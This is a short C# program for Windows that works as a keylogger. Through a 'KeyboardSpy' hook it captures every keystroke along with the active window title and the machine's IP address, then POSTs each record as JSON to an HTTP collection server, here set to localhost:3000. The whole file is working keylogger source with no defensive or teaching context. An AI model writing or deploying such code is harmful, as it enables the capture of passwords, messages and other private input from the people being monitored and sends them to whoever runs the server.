using System.Windows.Forms;
using System.Net.Http;
using Spy;
using System.Net;
using System.Linq;
using System.Net.Sockets;
using System;
using System.Web.Script.Serialization;
using System.Text;

namespace KeyTrackingForm   
{
    class KeyItem
    {
        public string ip { get; set; }
        public string appTitle { get; set; }
        public string key { get; set; }
    }


    class KeyboardSpyCallbackHttp : IKeyboardSpyCallback
    {
        static IPAddress ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(_ip => _ip.AddressFamily == AddressFamily.InterNetwork);

        async void IKeyboardSpyCallback.Execute(int vkCode, string appTitle)
        {
            using (var client = new HttpClient())
            {
                var item = new KeyItem
                {
                    key = ((Keys)vkCode).ToString(),
                    appTitle = appTitle,
                    ip = ip.ToString()
                };

                var json = new JavaScriptSerializer().Serialize(item);
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                var response = await client.PostAsync("http://localhost:3000/", content);
            }
        }
    }

    class InterceptKeys
    {
        public static void Main()
        {
            var keyboardSpyCallbackHttp = new KeyboardSpyCallbackHttp();

            var _hookID = KeyboardSpy.SetHook(keyboardSpyCallbackHttp);
            MessageBox.Show("Tracking started", "Message", MessageBoxButtons.OK, MessageBoxIcon.Information);

            Application.Run();
            KeyboardSpy.UnhookWindowsHookEx(_hookID);
        }
    }
}